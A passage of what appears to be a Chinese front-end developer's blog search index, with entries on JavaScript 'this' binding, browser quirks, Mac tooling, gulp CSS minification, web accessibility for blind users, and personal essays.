        <category>工具</category>
      </categories>
      <tags>
        <tag>mac</tag>
        <tag>Xcode</tag>
        <tag>Error</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[this的指向]]></title>
    <url>%2Fblog%2F2015%2F04%2F13%2F2015-04-13-this-reference%2F</url>
    <content type="text"><![CDATA[网友问题： 12345678910var name = "The Window"; var object = &#123; name : "My Object", getNameFunc : function()&#123; return this.name; &#125; &#125;; var a = object.getNameFunc;alert(a());alert(object.getNameFunc()); 原因： object.getNameFunc() ，此时的 object.getNameFunc 为引用类型，其 base 为 object，this 指向的是 base，所以返回 object.name 的值 name = object.getNameFunc, test 作为标识符，生成了其他引用类型的值，此时 base 已经从 object 重置为 null，也就是会指向 global（window），所以返回的是 window.name 的值。 问题的关键在于「引用类型（type Reference）的中间值发生改变」]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>this</tag>
        <tag>reference</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从Facebook跑来阿里的赵海平大叔，你要干啥？]]></title>
    <url>%2Fblog%2F2015%2F04%2F07%2F2015-04-07-zhaohaiping-in-my-eye%2F</url>
    <content type="text"><![CDATA[赵海平在今年三月份来到阿里，听毕玄（他现任主管）说去年五六月份就跟赵海平聊上了。有人问：为啥 BAT 三大巨头，你看中了阿里巴巴？在今天现场达一千多人的分享中赵海平给出了回复：“因为百度和腾讯没找我呗~”，他笑道，“百度以搜索为核心，优化了很多年了，估计也没啥可以优化的了；而腾讯除了 QQ 和微信，也没什么大型应用（别跟人家说哦）”。这不是原话哈，赵海平还是相当谦虚并且能言的，思维很开阔，两个小时的分享内容丰富，时不时还插两个故事，起初进场的手机和电脑都很自觉的收起来了~旁边的同事侃道：“高 P 也都是能搞 PPT 的。” 他分享的主题是《我眼中的Facebook的技术演进》，从 2006 年到 2014 年，Facebook 在技术上遇到的各种瓶颈和解决方案，演说过程灌输了不少自己的思考和经验，还是很有体会的，尤其是： 技术实践中的三件套：功能 + 测试 + 监控。很多大公司的工程师，深谙功能开发之道，测试方面也能达到 60 分的水平，但是程序的监控上，做的很差，包括 Facebook 的程序员。三件套，对一个优秀的工程师来说，缺一不可。 Facebook 以前没有 QA(测试人员)，现在也没有。没有 QA ，效率会高一些，但是一定要写测试用例…这方面他说的比较多，我也比较有感触的，现在在负责淘宝首页开发，也没有测试人员…但结果就是开发效率高了不少，胆子吓大了不少，自己也谨慎了不少。 估摸算算，赵海平应该也快半百了，这样大叔级别的人物，不好好在国外呆着呼吸清新的空气，跑到杭州吸啥 PM2.5。A同学道：大叔级别的人物也是有追求的好么~（不过他的颜貌就像三十出头的年轻人，帅气！） Facebook 网站刚刚搭建起来的时候，数据库就只有 info 一张表，这么笼统的描述，可见当时的工程师根本不会想到 FB 会发展到今天如此的壮大。随着 FB 的会员不断增长，一台服务器的数据库装不下去了，于是后来就多了很多个数据库，很多台服务器，数据容量一庞大，查询速度就慢了，接着在 07 年开始使用了 memcache，一段时间过后，CPU 不够用了，他们继续优化底层代码，用 C++ 重新实现 webServer 等等。这些事情都是大公司技术架构的演进过程中必然会经历的，根据自己的需要，把别人开发好的东西搬过来，优化and重构，在优化的过程中，甚至也会弄出一套全新的东西，比如 HipHop、HHVM 等等。 有人问，现在的高 P 都是不写代码的，你会写么？赵海平盹了一下，说：过来演讲前刚仓促的 push 了一些代码。他会把房子的基层建设做好，不让后来添砖加瓦的人走偏路，代码还是会写的。 我看到的是一个年轻有活力有底蕴的大叔，希望阿里巴巴因为这位技术大牛的加入而更加丰满！]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Safari不认识type为search的input]]></title>
    <url>%2Fblog%2F2015%2F04%2F03%2F2015-04-03-input-bug-in-safari%2F</url>
    <content type="text"><![CDATA[我平时很少测试 safari 和 firefox，系统默认的浏览器被我设置成 chrome. 昨天切图看到个表单，没用人家写好的组件，那一层套一层的 div 看了就怕，因为不需要做什么扩展，就自己写了个。 123&lt;div&gt; &lt;input type="search" name="q" id="J_Query" /&gt;&lt;/div&gt; 给 J_Query 写了一些样式，可是…Safari很任性的不认，左改右改搞了五六分钟没反应，火了！ 把 type 改成 text 就好了。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>bug</tag>
        <tag>CSS</tag>
        <tag>safari</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[根据访问属性进行差异化数据加载]]></title>
    <url>%2Fblog%2F2015%2F04%2F03%2F2015-04-03-detect-first-visit-usr%2F</url>
    <content type="text"><![CDATA[判断用户是否第一次访问页面，先不说怎么做，想想什么场景下会用到？ 如果我们页面的体积过大，用户第一次访问，会消耗大量的时间(2-5s)去下载页面所需要的资源，给用户带来的体验是很不好的，尤其是移动端的用户。如果我们可以在用户第一次访问的时候只加载主要内容，在这个主要内容中引导用户做更多的加载资源的操作，一方面可以让用户熟悉系统，一方面也给页面加载资源争取了巨量的时间，何乐而不为？！ 我们能最快想到的方案是，使用 cookie ，服务器根据 cookie 的属性（如某个 Tag 的值为 1 或者 0）来判断要给用户呈现什么样的内容，这样做有几点不好： 需要服务器协助，而很多时候前端对服务器的控制为 0 cookie在每次网页请求的时候都会附带，浪费 （当然，可以在用户访问一次之后清理这个 cookie，比如服务器端设置 session 值，不过又增加了后端的逻辑负担，而且不靠谱） 如果用户禁用了 cookie 呢？ 问题有很多，解决问题的方案也不少，针对这个问题，HTML5规范也提供了相应的事件和属性支持。 如何判断用户是否为第一次访问页面当页面加载的时候会触发 onload 事件，完了之后触发 pageShow 事件，pageShow 事件是页面每次加载都会触发的，而 onload 不然。默认情况下，浏览器会缓存当前访问的页面（隐私模式除外，特殊处理，也会缓存，退出隐私模式时，缓存的所有内容全部删除），当用户点击前进或者后退按钮时，浏览器会从缓存中获取内容，这个时候 onload 事件是不会触发的。 可以这么说： 如果待加载的页面不存在于缓存中，会触发 onload ，再触发 pageShow 如果待加载的页面存在于缓存中，不触发 onload，只触发 pageShow pageShow 事件对象 event 中有一个属性值，叫做 persisted，如果这个值为 true，则为缓存数据，false，则为第一次加载。 差异化加载12345678910var body = document.body;body.onpageshow = function(evt)&#123; if(evt.persisted)&#123; // 如果从缓存加载，该干啥干啥 doSomething(); &#125; else &#123; // 如果用户第一次访问（没有缓存），只加载主体框架 loadMainContent(); &#125;&#125;; 在 loadMainContent() 我们可以这样干： 123456funtion loadMainContent()&#123; // 引导用户执行操作，操作一次加载点东西 leadUserDoSomething(); // 或者悄悄地缓慢的加载需要的数据 loadDataInQuickMode();&#125; 当然，通过 cookie 或者 pageshow 事件属性判断用户浏览器是否有缓存数据不是最终的解决方案，但这是一种思考模式，可以发散思维~]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>first-time-visit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前人挖坑，后人填坑]]></title>
    <url>%2Fblog%2F2015%2F04%2F02%2F2015-04-02-cb-bugs%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 写代码不免出点 bug，没有人可以保证自己写的代码不出问题，而那些没有被挖掘出来的 bug，便成了后来者哭笑不得的坑…这段时间公司全面 https 改造，涉及到域名的迁移，域名的迁移不是 nginx 做个映射就完事儿了，还有各种代码的去 schema，各种组件的搬迁，算是一个大手术！我看最近百度主站也升级到了 https，期间应该出过一次问题吧，貌似回滚了一次，他们遇到的坑应该还不算多，只是 www 域升级，而不是全网。公司最近出了不少的问题，大小问题都有，表面看是前人挖的坑，实际是整体架构思考的有欠缺。当我们放下一个项目转投下一个时，手头的东西就要转交给他人处理，或者..不再有人处理，可代码还在那里，搞不好你就引用了别人的东西，保不准哪天别人的代码里就爆出了个大 bug，当然这里的”别人”也可能是 你！我们既不希望自己是受害者，更不希望自己是施害者。1. 如何挖坑挖坑可不是一件简单的事情，你写出来的插件、组件、代码，很可能被很多人用到了，各种业务场景下狂奔你的代码，一堆测试人员检测你的bug，所以在项目中埋坑可不是一件容易的事情。那么如何埋坑呢？可以参考以下方案：在一个文件中放一坨很长很长的代码，不加注释，不解耦程序把判断都放在一层嵌一层深深的逻辑里头程序中临时加入几个全局的标记变量，在很多地方改变变量的值，在很多地方使用变量的值不考虑多变的场景，不实时容错，让他按照你脑子的轨迹跑到处散播不同版本的代码，不整理统一的文档如果这些方案还不够你挖坑，我想你团队同学的技术水平也真真是太高了。很多时候，我们都是不经意间留下了隐患。当自己写的东西被其他人使用后，程序需要兼顾的场景就会增多，出现的问题也会变多，这个时候我们不得不完善自己的代码逻辑。结果就是，逻辑耦合度高了不少，代码层次深了不少，出错的概率也就增加了不少。所以在设计一个功能或者组件的时候，该考虑什么，不该考虑什么，一定要理清楚。并不是所有东西都适合往代码里加，我们不是在做 ExtJS 这个整体方案，也不是编织一个底层的操作库，只是用少量的逻辑整合离散化、个性化的业务，这些逻辑越少越好，与核心逻辑无关的内容就必须抽离出来！2. 使劲踩坑如果说挖坑是一件很有难度的活儿，那踩坑就更难了。其实可以说难的不是踩坑，而是发现自己踩坑了。在一堆巨量的文件中找出「因把等于号写成恒等号」造成的 bug，这不是轻松的事情，可能你在 debugger 的时候进入了别人的代码领域，对着别人巨长而又没什么注释的代码，估计当场就晕了，更晕的是，自己却还在怀疑这到底是不是这堆代码里头的问题。团队合作中，我们心里默认相信队友，队友产出的代码是没有问题可以直接拿过来使用的，所以一旦出现问题，我们怀疑更多的是自己，质疑别人需要很大的勇气，尤其是质疑那些成熟的框架，用了很多年的代码。那么如何踩坑呢？我们可不喜欢踩坑，有的坑踩进去就跳不出来了，最后只能选择其他方案处理。很少有前端同学写程序的测试用例，可能还有一部分同学根本就没听说过什么测试用例。而在后端中（比如nodejs）没有测试用例的代码就是一堆废代码，除了自己可以拿着用用，别人根本就不敢用的。那么测试用例会考虑做那些事情呢？简单点说：写出有问题的代码，让程序按照期望的出错方式出错，如果没有，程序就有bug写出没问题的代码，让程序按照正常的流程返回正确的结果，如果没有，程序就有bug测试用例要覆盖到程序中所有的逻辑判断，比如 if elseif else 等判断的逻辑都要覆盖进去。当我们的测试代码覆盖了100%的逻辑，那坑位就展露无遗了。埋坑人的致命弱点就是很少对程序作出异常情况判断，只要找出程序中的异常点，试图以另类的方式触发这个异常，你就顺利踩坑了！3. 用力填坑首先，填坑是一种责任。发现问题是最难的，解决问题只是时间的问题。当我们确认了一个坑之后，第一件事情就是告诉别人这里有坑，你不要踩了。但是最好再多补一句话：你先别踩，等我填好了坑你再来。我这觉得这句话真的很暖人心，程序猿之间的关怀就应该这么赤裸裸的。尽管，有的时候，这个坑不是你挖的..当我们挖好坑，踩完坑，再埋好坑之后，回头想想自己在团队中扮演什么样的角色，挖坑者还是埋坑者？这必然是有益于成长的。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[干掉浏览器中的自动填充]]></title>
    <url>%2Fblog%2F2015%2F03%2F31%2F2015-03-31-autocomplete-in-browser%2F</url>
    <content type="text"><![CDATA[当我们在 chrome 浏览器中填写表单之后，如果表单中包含密码域，浏览器将会提示用户是否记住密码。一旦记住密码，即便这次填写的是错误的，下次登录时浏览器也会任性的给你自动填充信息。 这是开发者不喜欢看到的，对用户来说，也是不太安全的，通过 1console.log(document.getElementById("passwordInput").value) 就能拿到密码明文。虽加强了体验，但削弱了安全性，也让有「强迫症」的程序员感到颇为不爽。 当页面加载的时候直接将表单域设置为空，貌似是不起作用的。原因是，浏览器在页面加载到一定程度时（我也不知道是什么时机）从自己的数据库中挖出曾经保存的表单域，填充进去。 有人想到使用定时器，检测表单是否存在数据，这样的操作费时费力，不提倡。 可以考虑这个方案： 每个 input 都有 defaultValue 属性，这是 DOM 初始化的时候给它加上的，判断 12input.defaultValue == input.value // 如果相等则不处理，如果不相等则将 value 置为空 感觉是，是靠谱的！]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>autocomplete</tag>
        <tag>自动填充</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac下的效率工具autojump]]></title>
    <url>%2Fblog%2F2015%2F03%2F30%2F2015-03-30-autojump-in-mac%2F</url>
    <content type="text"><![CDATA[IDE 用起来总是得不到满足，Mac 适合搞开发，我也十分喜欢 Mac 系统，当然可以说喜欢 Unix/Linux 系统。今天在 .zshrc 文件中添加了这么几行快捷命令： 123alias gow = "cd ~/barretlee/work"alias gotb = "cd ~/barretlee/work/tb"alias gotbn = "cd ~/barretlee/work/tb/node" 写完之后我立马把这几行命令删掉了，这种方式似乎有点二。网上搜罗了下，找到了一个挺不错的工具 - autojump。 Autojump 自己是这么描述的： autojump is a faster way to navigate your filesystem. It works by maintaining a database of the directories you use the most from the command line. 通过 history 命令你可以找到最近用过的命令，比如 1history | grep "git clone" 通过上述命令就能找到近期 clone 了哪些库，省却了写一堆代码的功夫。autojump 就是通过记录你在 history 中的行为把你访问过的文件夹路径都 cache 下来，当你进行如下操作时： 1autojump node 他会直接跳到之前访问的 ~/barretlee/work/tb/node 目录下。他还有一个快捷方式： 1j node 我很喜欢这个小工具，让我游荡于文件夹之间不费吹灰之力。 安装： 建议安装 zsh 建议安装 homebrew brew install autojump 在 .zshrc 中找到 plugins=，在后面添加 1plugins=(git autojump) 然后继续在上述文件中添加 1[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh source ~/.zshrc Enjoy coding. :)]]></content>
      <categories>
        <category>苹果</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>mac</tag>
        <tag>效率</tag>
        <tag>autojump</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac数据迁移xcode错误问题]]></title>
    <url>%2Fblog%2F2015%2F03%2F29%2F2015-03-29-mac-backup-about-xcode%2F</url>
    <content type="text"><![CDATA[在安装 Homebrew (Mac 下的软件管理工具，类似 linux 的 apt-get、yum 等)的时候，系统报错： 1xcode-select: error: command line tools are already installed, use "Software Update" to install updates 网上搜罗了下，是 xcode 直接从其他电脑复制过来导致的问题，可以执行以下命令查看他的来源： 1xcode-select -p 果然，返回的结果是： 1/Volumes/Macintosh HD/Applications/Xcode.app/Contents/Developer 一个错误的路径，Macintosh HD 是另一台电脑的硬盘名称，处理方式也比较简单，将路径修改过来： 1sudo xcode-select --switch /Library/Developer/CommandLineTools 验证方式：在命令行输入 gcc，如果没有报出之前的错误（xcode-select: error: …) 就 ok 了。]]></content>
      <categories>
        <category>苹果</category>
      </categories>
      <tags>
        <tag>mac</tag>
        <tag>数据迁移</tag>
        <tag>xcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac数据克隆]]></title>
    <url>%2Fblog%2F2015%2F03%2F28%2F2015-03-28-mac-data-backup%2F</url>
    <content type="text"><![CDATA[IT人士，尤其是前端，现在都偏爱 mac，很多人自己买了 mac，公司也给配了一台。最近因为工作需求就申请了一台 mac pro，那么，问题来了，我是个懒蛋，我可不喜欢把软件都重新安装一遍，过两天就要上班了，配置好工作环境颇为紧急。 咨询了下有经验的朋友，一般的处理有两种方式： 使用 Mac 自带的 Time Machine，这个速度我看了下，136G 的东西备份过去需要接近 1 个小时，Time Machine 是个不错的东西，但是苹果的硬盘一般不会很大，定制大容量硬盘的土豪咱们先不理会。 使用雷电线，将旧电脑设置成「目标磁盘模式」(系统设置-&gt;启动磁盘-&gt;目标磁盘模式)，使用雷电线连接新旧电脑，重启旧电脑，此时旧电脑就会以磁盘形式挂载在新电脑上。 我没尝试第一种方式，136G 数据的备份是备份到我的移动硬盘中。雷电线，其实我也不知道这个叫法正不正确，他就是两端都能插入电脑的线(扩展屏接口位置插入)。 备份的方式也比较原始，复制 &amp; 粘贴。之所以叫做雷电线应该是传输的速度飞快吧，”咔咔”两下数据就全部过来了。 最头疼的软件，虽然可以直接把 /Application 下的数据 copy 到新电脑，但软件的很多配置信息都没有了，都得重新搞一次。还有命令行相关的就只能手动再搞一次，不知道是否有其他方案？ 暂记于此。]]></content>
      <categories>
        <category>苹果</category>
      </categories>
      <tags>
        <tag>mac</tag>
        <tag>TimeMachine</tag>
        <tag>数据备份</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gulp打包压缩css遇到的坑]]></title>
    <url>%2Fblog%2F2015%2F03%2F26%2F2015-03-26-attention-in-gulp-minify-css%2F</url>
    <content type="text"><![CDATA[很久没过来记录了，今天遇到了个坑，很坑的坑。 之前看过一些 gulp 和 grunt 相关的东西，但是没怎么用，有一次做项目用到，不过那次做的是一个监控系统，内部用，不要考虑兼容性问题，今天在处理业务的时候，用到了 gulp。 业务的老代码，不算很陈旧，2013年的（尚好是吧~）,那个时候也没啥太好用的压缩工具，翻出来的代码也没有一个默认的脚本可以自动打包，于是就用上了 gulp。 css 打包代码： 123456789gulp.task('css', function()&#123; gulp.src('src/**/*.css') .pipe(gulp.dest('build')) .pipe(minicss()) .pipe(rename(&#123; suffix:"-min" &#125;)) .pipe(gulp.dest('build'));&#125;); 坑在哪里呢，没仔细看文档，gulp-minify-css 这个 gulp 插件就直接用上了，没想到他竟然把所有的低版本IE hack代码给干掉了，哭… 同学们要引起注意，记得在 minicss() 中送入参数： 123&#123; "compatibility": "ie7"&#125; 具体其他配置请移步官方文档。]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>gulp</tag>
        <tag>minifycss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我没什么可以失去的]]></title>
    <url>%2Fblog%2F2015%2F02%2F10%2F2015-02-10-%E6%88%91%E6%B2%A1%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E5%A4%B1%E5%8E%BB%E7%9A%84%2F</url>
    <content type="text"><![CDATA[高中毕业之后，便感觉自己缺少敬畏之心，总是挑战“权威”，也敢于对很多事情说「不」。 面对一个新的事物、新的观点，我很少用肯定的态度看待。脑海中闪过的第一个念头便是，这东西不好，是错的，存在问题，不可取…直到慢慢的发现它的好。 我喜欢逻辑性很强的电视剧、小说、影片，一旦从屏幕中发现了不合理的内容，便立生厌恶，心底冒出“烂片”二字。 抉择的时候，我相信瞬间的判断。 我始终相信一个东西只要存在，就有他的合理性，即便是天下人都在排斥，我都会为他辩驳，为他寻找自身存在的理由。 我的消费观念是，钱可以乱花，因为他只是几张纸，但是东西不能浪费。我很节制的使用资源，水、米饭、电。糟糕厨师烧出来的菜，我会想红军长征的时候他们在吃什么，然后不知不觉把东西吃光。 我总是在最累的时候做更累的事情。停不下来，直到濒临崩溃。 我没什么可以失去的，所以我总是放开胆子拼搏。 我相信未来是可以创造的。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2015，充满未知]]></title>
    <url>%2Fblog%2F2015%2F01%2F01%2F2015-01-01-2015%EF%BC%8C%E5%85%85%E6%BB%A1%E6%9C%AA%E7%9F%A5%2F</url>
    <content type="text"><![CDATA[很清楚地记得，十二年前，我家是个小平房，屋檐前边有一排石棉瓦，用五根杯口粗的空心铁柱子撑起，遮风挡雨。 下午五六点我从学校蹦哒着跑回来，爸妈还在外头忙着，我没进门，直接去了隔壁小胖家。小胖的妈妈问我要不要在她家吃饭，我说不用，我爸妈等会儿就回来。 夜色朦胧，我拖着书包走到那片石棉瓦下，没开门，抱着柱子，等着。门前是条大马路，车来车往。但夜色笼罩下的乡村十分宁静，马路上也只有稀疏的几盏车灯亮过。 踮起脚尖，探望前方依稀明亮的车灯。嗯，应该是爸妈回来了。左侧亮起的车灯又从右侧暗淡下去，直到留下全部的夜色，继续伸出脖子观望… 时隔十二年，我也已经长成了一个青年。 离开象牙塔后直奔北京、杭州。繁华的大都市，生活节奏远不是乡下可以比拟。每每用尽全力去寻找出路，每每都吃尽苦头。现在，我在杭州一隅。 去过好几次西湖，人头攒动，异常热闹。今天，路过西湖，踏着步子，随意走了几步，一个人。 阳光很刺眼，风也很大。 下午四点多，该回家了。站在马路牙子上，又是观望。上不去挤满了游客的194，招不到回家的的士。最后上了辆黑的，不打表，价格double，招客、拼车，路上还想甩客…平时一个小时的路程，因为堵车，加上黑的绕道载客，走了两个小时。 回家的路上寒风又开始肆意，吹得心很凉。 告别了颠簸的2014，人好像变得傻乎乎的。2015的就第一天过的也是如此的糟糕，人家的「狗屎运」在我这里总会少个「运」字。 本文的标题本来是『有一种痛，叫孤单』，写着写着却成了新年展望，那也不妨来展望一下。 关于工作 最近找我的猎头不少，师兄说过段时间他们找多了，挖不动就会停下来的。我内心期待稳定，稳定的工作环境，稳定的收入。但是目前来看，似乎算不上稳定，稍微生个大病估计就会回到解放前。 也有不少创业团队希望可以找到年轻有理想的小伙伴出去拼搏，我动心过，我也是一个不甘平庸的人，不过还是放弃了。因为，我还不够。 我想，2015年，我的工作是稳定的。 关于爱情 我曾经对自己说，24岁开始恋爱，好像这不太对。寻找一个能够厮守终生的人本身就是一件特别难得的事情，如果碰到了对的人，那就应该去做对的事情。 我的爱情宣言，引用一个小伙伴说的话：“找一个自己喜欢的人谈恋爱，找一个喜欢自己的人结婚。” 关于身体 2014，睡觉时间平均下来，应该是1点钟睡，9点起床。几乎不运动，爬过几次山，所以肉自然就多了。可以看看三年前的我： 现在的我： 我反正看不出这是同一个人，除了都有胡子。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我最近两周的生活]]></title>
    <url>%2Fblog%2F2014%2F12%2F23%2F2014-12-23-%E6%88%91%E6%9C%80%E8%BF%91%E4%B8%A4%E5%91%A8%E7%9A%84%E7%94%9F%E6%B4%BB%2F</url>
    <content type="text"><![CDATA[现在的心情是十分沮丧的，所以不免说出些沮丧的话来。最近两周的生活有焦点，但却出现了两个焦点，一个让人激情澎湃，一个让人无限低糜，所以心很乱。 当生活有了圆心，就会出现半径。半径虽时大时小，环绕在一个圈子里，人却总是幸福的。但圈子的半径也会时常接近于零，那时自己没了跻身之地，就感觉被整个世界嫌弃。 我一直在寻找一个可以作为我人生导向的圆心。把心放在那里，我去寻找更大的半径。可是好难。就像漂泊在大海上，不知道何时下锚，也找不到岸。所以会很累。 人一旦有了疲惫感就容易放弃。放弃所爱的，放弃所想的，甚至会放弃自己。疲惫的人渴望有一面不冷的墙可以倚靠，疲惫的心需要有人献出一丝关怀。可我是个奇葩，越是疲惫，越是屹立不倒，直到…倒下。 我讨厌等待，但不得不等待；我讨厌漫长的等待，但偏偏就是漫长的；我讨厌没有结果的等待，但结果偏偏就是未知的。所以我很急于翻开书的下一页，看看故事是如何发展的，我就是这么个急性子。 很开心老大把淘宝首页的工作交给了我，更开心的是我发现这件事竟然如此地具有挑战性，所以我会做好它。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[也让盲人拥抱互联网]]></title>
    <url>%2Fblog%2F2014%2F12%2F21%2F2014-12-21-cb-wai%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 中国盲人人数已经超过了600万，平均每200多人中就有一位是盲人，这个规模还是相当庞大的。由于视觉障碍，盲人同这个世界的交集小了很多，但互联网的的发展为他们打开了一扇与更多人交流的窗口。[图片取自网络 - 吴铸上网只需要键盘、音响和麦克]这个窗口的开关掌握在我们工程师手中！我们有义务也有责任为他们开窗！一、上网的盲人用户和统计方式盲人中真正有条件并且会上网的有多少呢？我们一开始就遇到了一个难题：如何判断用户是盲人用户？视障人士主要通过读屏软件来获取网页信息，苹果的产品自带 VoiceOver，感兴趣的同学可以体验下。这里有一篇 VoiceOver 的使用教程，学会使用并不难，难的是把耳朵当眼睛使的繁琐。PC 上和 mobile 上，盲人与机器的交互方式完全不一样，PC 上主要使用键盘操作，读屏软件提供了很多的快捷键，如果操作熟练，速度也是杠杠的！（只不过现在的软件很少提供和谐的文字引导，导致盲人使用起来受阻，webpages也是如此）而 mobile 中，盲人通过触摸屏的滑动获知页面信息，两种读屏就需要我们使用两种方式去判断。1. PC在读取屏幕时，tab 是使用最频繁的键，当然还有 shift+tab，两个操作键的作用，前者是向下一个可聚焦元素聚焦，聚焦上去之后读屏软件会读取元素属性，如果是文字，会读取文字内容，如果是图片，就读取图片 alt 内容。后者是向前聚焦。所以我们就想到，通过监听 window 的 tab 点击事件，在规定时间内有连续多次触发该事件则认定该用户为无障碍受众用户。经过讨论，我们把连续点击次数设定为 10 次，监听到连续 10 次之后，发送统计，销毁事件。2. MobileMobile 上的统计是件麻烦事儿，没有键盘操作，只有 touch 屏幕，通过用户手势去判断这条路不可走，一方面是因为读屏软件的手势不在 web 页面的监控范围内，另一方面，手势动作判断实在是麻烦。经过多次讨论，继续使用 PC 端的方案。TAB 键会让页面元素聚焦，那么我们在 Mobile 就监听元素的聚焦事件。监听所有元素的focus事件，在规定事件内有连续3次触发该事件则认定该用户为无障碍受众用户：发送统计，销毁事件。这里我们将触发次数修改成了 3，主要是因为 Mobile 可操作区域并不大，三两下操作就跳转到下一个页面了。二、网页中普遍存在的『有障碍』访问问题1. img 标签无 alt 属性，不可读图片是电商网站中最重要的角色，但是盲人的世界里没有可视化的图片，如果页面上的 img 标签不加 alt 属性，对盲人来说这就是个无用网站。让图片可读，一件可轻松搞定的事情，却可以造福千千万万的视障人士，你值得去做！2. 可操作元素，无法聚焦诸如此类的 tab 切换随处可见，网页可聚焦的元素不多，a、input、button、area 等等不到十个。我们通常使用 li 元素作为 tabHeader 的切换元素，这种情况下，盲人使用键盘操作是没有办法聚焦上去的，结果就是很多内容查看不到。这是一个容易被忽略，但是影响面极广的问题，希望大家可以重视！ 解决方案很简单，给元素加个 tabIndex 属性。3. 模板渲染页面后，焦点停靠不合理两个十分让盲人受伤的问题：焦点本来聚焦到 A 区块的某个元素，通过 ajax 重新渲染 A 区块之后，页面失去焦点从导航栏直接跳转到某个锚点位置，但是焦点没有跟着一起指向锚点区域的第一个元素从体验上来看，上面两个问题都是糟糕透了！但是我们只需要在 js 中附加一句 1$(&quot;.destination:first-child&quot;).focus() 之类的，一句简单代码搞定所有视障用户的痛！4. 标签语义化不够读屏软件有个比较给力的快捷键，他可以让用户快捷的定位 Header 标签，这样可以减少使用很多次 tab。在我们的双十二活动页面中，很多页面都有商品楼层，每个楼层都有一个标题，但是部分页面中我们的工程师并没有使用 H 标签而是 div 标签来标识标题（有时候标题是个图片），这一点让盲人郁闷至极。三、『有障碍』问题的解决方案我们重点做一件事情&mdash;&mdash;让所有的图片可读！关于网页无障碍的内容，w3c 提出了一堆规范（相关信息可以查阅 WAI），如果按照规范来找问题，那我们的工程师有的忙了。所以我们挑了几个影响最广泛的点进行单点突击！第一步就是让所有的图片可读，不管是后端直接输出、TMS渲染、前端异步加载渲染的图片，全部加上 alt 标签，这是最简单的操作，也是推动起来最简单的点。当然，最后，我们的盲人测试团队的反馈是：图片可读这块做的很棒！第二步就是扫清所有通向下一步（或者说通向支付）的网页障碍，一个流程下来，我们希望每个在淘宝上购买商品的盲人都能够成功支付。很显然，上面提到的解决方案都是人为去推，这种方式是不长久的，我们希望所有的工程师都有这种意识，主动去改善网页的可读性。四、小结先说说现在存在的问题，概括性讲，有三点：不知道无障碍不知道做什么知道无障碍但是推不动为此我们无障碍小组也进行了脑暴：工具/平台上集成，比如给 img 标签强制或者自动加上 alt 属性国外开发的无障碍检测工具，移植过来，搭建测试平台页面结构化，使用元数据/元编程无障碍方面编程的规范化，白皮书接入到测试流程中….想了很多点子。我们的目标很明确：让网页可读，对盲人易用。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>WAI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[种子，的迷惘]]></title>
    <url>%2Fblog%2F2014%2F12%2F18%2F2014-12-18-%E7%A7%8D%E5%AD%90%EF%BC%8C%E7%9A%84%E8%BF%B7%E6%83%98%2F</url>
    <content type="text"><![CDATA[呼吸的痛，难以破壳 狭小，黑暗，凄冷 期待着阳光 生命残喘之际，迷惘了 活着，还是沉寂 风依然瑟瑟的刮着 只是，没了寒意 休眠吧 没力气挣扎了 可，种子知道 休眠就是永别 好冷…]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[种子，的眺望]]></title>
    <url>%2Fblog%2F2014%2F12%2F14%2F2014-12-14-%E7%A7%8D%E5%AD%90%EF%BC%8C%E7%9A%84%E7%9C%BA%E6%9C%9B%2F</url>
    <content type="text"><![CDATA[一颗种子，飘落在土地上，不经意地 没怎么理会，它竟然萌芽了 种子不适应这个季节，一直处于发芽状态，很吃力 它想发芽，很想 露出一头 太冷，又缩了回去 它知道露出头就意味着失去自己 它使劲的汲取养分 在残缺外壳的包裹下等待生命的怒放 壳缝中感受太阳的丝丝温暖 更多的却还是在凄冷中颤抖 种子知道，春天不远，但需要静静等待。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[textarea高度自适应]]></title>
    <url>%2Fblog%2F2014%2F12%2F04%2F2014-12-04-textarea-auto-height%2F</url>
